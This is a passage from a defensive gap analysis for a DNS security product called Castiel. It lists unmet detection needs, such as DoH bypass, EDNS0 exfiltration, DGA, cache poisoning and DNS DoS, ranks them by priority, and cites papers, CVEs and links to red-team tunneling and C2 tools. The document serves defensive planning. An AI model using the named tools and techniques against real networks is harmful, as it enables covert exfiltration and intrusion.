- **Castiel Coverage:** ❌ Gap — No DoH client detection or classification.
- **Recommended:** Implement DoH traffic interception at the firewall level. Force all DoH through Castiel's own DoH upstream. Block unauthorized DoH clients.

### 5.4 Disposable Domain Abuse

- **Source:** IEEE TNSM 2023
- **Mechanism:** Disposable domains (one-time-use domains for legitimate signaling) share characteristics with Water Torture attack FQDNs. Attackers abuse the disposable domain pattern to camouflage DNS water torture attacks.
- **Castiel Coverage:** ❌ Gap — No disposable domain pattern detection.
- **Recommended:** Track domain lifecycle patterns. Flag domains that receive a single query and never appear again (disposable pattern). Distinguish legitimate disposable domains (CDN tokens, password reset links) from malicious ones.

---

## 6. Recommended Implementation Priorities

### Tier 1: Critical (Implement First)

| # | Gap | Effort | Impact |
|---|---|---|---|
| 1 | **EDNS0 option inspection** — Parse and validate ECS, cookies, SVCB in queries | Medium | Detects SiphonDNS-style exfiltration that completely bypasses current detection |
| 2 | **Per-domain NXDOMAIN rate limiting** — Track NXDOMAIN per apex domain, not just per-IP | Low | Detects distributed DNS water torture attacks |
| 3 | **Fragmentation defense** — Limit EDNS0 UDP payload to 1232 bytes, drop fragmented UDP DNS | Low | Prevents fragmentation-based cache poisoning |
| 4 | **DNSSEC downgrade detection** — Alert when previously-validating domains start failing | Low | Detects DNSSEC stripping and downgrade attacks |
| 5 | **Response packet validation** — Strict validation of DNS response structure | Medium | Prevents TUDOOR-style malformed packet attacks |
| 6 | **DoH bypass detection** — Detect/block unauthorized DoH clients on the network | Medium | Closes biggest blind spot for C2 and exfiltration |

### Tier 2: High Priority (Implement Next)

| # | Gap | Effort | Impact |
|---|---|---|---|
| 7 | **Fast-flux detection** — IP rotation rate, ASN diversity, double-flux NS rotation | Medium | Improves C2/fast-flux detection beyond current TTL volatility |
| 8 | **Dictionary DGA detection** — Dictionary coverage analysis alongside n-gram | Medium | Catches dictionary-based DGAs that bypass entropy detection |
| 9 | **Sparse DGA detection** — 24h rolling NXDOMAIN ratio per host | Low | Catches low-frequency DGA polling (3 domains/hour) |
| 10 | **CNAME chain validation** — Detect dangling CNAMEs, CNAME loops, chain depth limits | Medium | Prevents dangling CNAME hijacking and CNAME loop DoS |
| 11 | **DNS Calculation detection** — Correlate DNS responses with subsequent connections | High | Detects APT12-style port calculation C2 |
| 12 | **Low-and-slow exfiltration detection** — 24h+ domain behavior analysis | Medium | Catches FrameworkPOS-style low-throughput exfiltration |
| 13 | **Lookalike domain detection** — Levenshtein distance + homoglyph detection | Medium | Catches phishing/typosquatting domains not on blocklists |

### Tier 3: Research / Future

| # | Gap | Effort | Impact |
|---|---|---|---|
| 14 | **GAN-resistant detection** — Volume-based detection, adversarial training | Research | Defends against DOLOS-style AI-generated exfiltration |
| 15 | **DNS timing channel detection** — Inter-query timing analysis | Research | Detects covert timing channels |
| 16 | **Domain shadowing detection** — Subdomain baseline tracking per domain | Medium | Detects stealthy subdomain creation under legitimate domains |
| 17 | **Ghost domain detection** — TTL cap enforcement, delegation refresh monitoring | Medium | Prevents revoked domains from persisting in cache |
| 18 | **Phantom squatting feed** — LLM hallucinated domain tracking | Low (feed-based) | Catches AI-era phishing domains |
| 19 | **TDS redirect chain detection** — Multi-hop DNS redirect pattern tracking | Research | Detects malicious adtech traffic distribution |
| 20 | **0x20 encoding** — Implement and validate mixed-case encoding | Low | Additional cache poisoning defense layer |
| 21 | **PRNG state recovery detection** — Detect systematic RRset ordering queries | Research | Detects 2026-era PRNG-based cache poisoning |
| 22 | **RebirthDay detection** — ECS coherence validation, query aggregation monitoring | High | Defends against latest Birthday attack revival |
| 23 | **DNSBOMB detection** — Query aggregation pattern monitoring, EDNS0 size tracking | Medium | Detects pulsing DoS amplification attacks |
| 24 | **Browser-based exfiltration detection** — Process correlation, prefetch pattern detection | Research | Detects JavaScript-based DNS exfiltration |
| 25 | **Sitting Ducks feed** — Track known hijacked domains, lame delegation patterns | Low (feed-based) | Protects against domain hijacking via lame delegation |

---

## 7. References

### MITRE ATT&CK
- [T1071.004 — Application Layer Protocol: DNS](https://attack.mitre.org/techniques/T1071/004/)
- [T1568 — Dynamic Resolution](https://attack.mitre.org/techniques/T1568/)
- [T1568.001 — Fast Flux DNS](https://attack.mitre.org/techniques/T1568/001/)
- [T1568.002 — Domain Generation Algorithms](https://attack.mitre.org/techniques/T1568/002/)
- [T1568.003 — DNS Calculation](https://attack.mitre.org/techniques/T1568/003/)
- [T1572 — Protocol Tunneling](https://attack.mitre.org/techniques/T1572/)
- [DET0262 — DNS Calculation Detection Strategy](https://attack.mitre.org/detectionstrategies/DET0262/)
- [DET0485 — Fast Flux DNS Detection Strategy](https://attack.mitre.org/detectionstrategies/DET0485/)
- [DET0400 — DNS Tunneling Detection Strategy](https://attack.mitre.org/detectionstrategies/DET0400/)

### Academic Papers
- Man et al., "DNS Cache Poisoning Attack Reloaded: Revolutions with Side Channels" (CCS 2020) — SAD DNS
- Man et al., "DNS Cache Poisoning Attack: Resurrections with Side Channels" (CCS 2021) — SAD DNS v2
- Li et al., "RebirthDay Attack: Reviving DNS Cache Poisoning with the Birthday Paradox" (CCS 2025)
- Ben-Simhon et al., "DNS Cache Poisoning Like it's 2006" (USENIX Security 2026) — PRNG state recovery
- Afek et al., "POPS: From History to Mitigation of DNS Cache Poisoning Attacks" (USENIX Security 2025)
- Zhang et al., "TUDOOR: Systematically Exploring and Exploiting Logic Vulnerabilities in DNS Response Pre-processing" (IEEE S&P 2024)
- Duan et al., "Ghost Domain Names: Revoked Yet Still Resolvable" (NDSS 2012)
- Dai et al., "DNSBOMB: A New Practical-and-Powerful Pulsing DoS Attack Exploiting DNS Queries-and-Responses" (2024)
- Shulman, "Fragmentation Considered Leaking: Port Inference for DNS Poisoning" (PAM 2014)
- Li et al., "TsuKing: Coordinating Resolvers and Queries into Potent DoS Amplifiers" (2023)
- DOLOS: "DNS Exfiltration Guided by Generative Adversarial Networks" (IEEE EuroS&P 2024)
- Takeuchi et al., "Detection of the DNS Water Torture Attack by Analyzing Features of the Subdomain Name" (2016)
- Hasegawa et al., "FQDN-Based Whitelist Filter on a DNS Cache Server Against the DNS Water Torture Attack" (2021)
- "Detection of malicious and low throughput data exfiltration over the DNS protocol" (Computers & Security, 2018)
- "DNS Tunnelling, Exfiltration and Detection over Cloud Environments" (Sensors, MDPI, 2023)
- "FF-MR: A DoH-Encrypted DNS Covert Channel Detection Method Based on Feature Fusion" (Applied Sciences, 2022)
- "Detecting DNS over HTTPS based data exfiltration" (Computer Networks, 2022)
- "Browser-Based Covert Data Exfiltration" (arXiv, 2010)
- "DNSxD: Detecting Data Exfiltration over DNS" (IEEE, 2019)
- "Collaborative Defense Framework Using FQDN-Based Allowlist Filter Against DNS Water Torture Attack" (IEEE TNSM, 2023)
- "Revisiting Open DNS Resolver Vulnerabilities to Reflection-Based DDoS Threats" (CSCWD, 2024)
- Yazdani et al., "A Matter of Degree: Characterizing the Amplification Power of Open DNS Resolvers" (PAM 2022)
- Yazdani et al., "Glossy Mirrors: On the Role of Open DNS Resolvers in Reflection and Amplification DDoS Attacks" (CNSM 2024)

### Threat Intelligence Reports
- Infoblox, "DNS Threat Landscape Report 2025" — TDS, Sitting Ducks, dangling CNAMEs, lookalike domains, DNS tunneling tools
- Palo Alto Unit42, "Automatically Detecting DNS Hijacking in Passive DNS" (2024) — 6,729 hijacking incidents detected
- Palo Alto Unit42, "Understanding DNS Tunneling Traffic in the Wild" — SUNBURST, OilRig, xHunt, DarkHydrus, Cobalt Strike, Decoy Dog
- Eclypsium/Infoblox, "Ducks Now Sitting (DNS): Internet Infrastructure Insecurity" (2024) — Sitting Ducks attack, 1M+ exploitable domains
- CSA, "Phantom Squatting: AI Hallucinated Domains" (2026) — LLM-generated domain weaponization
- Mohflo, "Cloudy with a Chance of Hijacking: Forgotten DNS Records" (2025) — Hazy Hawk threat actor, dangling CNAME attacks on cdc.gov

### Red Team Tools & Techniques
- [SiphonDNS](https://github.com/ttpreport/siphondns) — EDNS0-based covert exfiltration (ECS, cookies, SVCB)
- [dnscat2](https://github.com/iagox86/dnscat2) — Encrypted C2 over DNS (ECDH + Salsa20)
- [iodine](https://github.com/yarrick/iodine) — IPv4 tunnel over DNS
- [dns2tcp](https://github.com/alex-domain/dns2tcp) — TCP over DNS
- [Cobalt Strike](https://www.cobaltstrike.com/) — DNS beacon with `www`/`post`/`api` prefixes
- [DNSStager](https://github.com/r3nhat/DNSStager) — DNS-based payload staging
- [sliver](https://github.com/BishopFox/sliver) — C2 framework with DNS support
- [SADDNS](https://github.com/seclab-ucr/SADDNS) — Side channel DNS cache poisoning tool

### CVEs
- CVE-2020-12244 — Ghost Domain Names (BIND, most DNS software)
- CVE-2022-30256 — Ghost Domain variant (MaraDNS Deadwood)
- CVE-2025-8036 — DNS rebinding / CORS bypass (Mozilla, VU#652514)
- EUVD-2026-47932 — PowerDNS Recursor ghost domain TTL bypass (TOCTOU race)
- 50 CVEs from RebirthDay attack disclosure (BIND, Unbound, PowerDNS, Quad9, etc.)

### Standards & RFCs
- RFC 6891 — EDNS(0) Extension Mechanisms for DNS
- RFC 7871 — EDNS Client Subnet (ECS)
- RFC 7873 — DNS Cookies
- RFC 8484 — DNS over HTTPS (DoH)
- RFC 5452 — Measures to prevent DNS cache poisoning
- RFC 2308 — Negative caching of DNS responses
- draft-vixie-dnsext-dns0x20-00 — 0x20 encoding (mixed case randomization)
- draft-fujiwara-dnsop-fragment-attack — Measures against cache poisoning using IP fragmentation

---

*Document generated: August 2026*
*Castiel version: 0.1.0*
*Research scope: MITRE ATT&CK v19, academic papers 2018-2026, active CVEs through 2026*
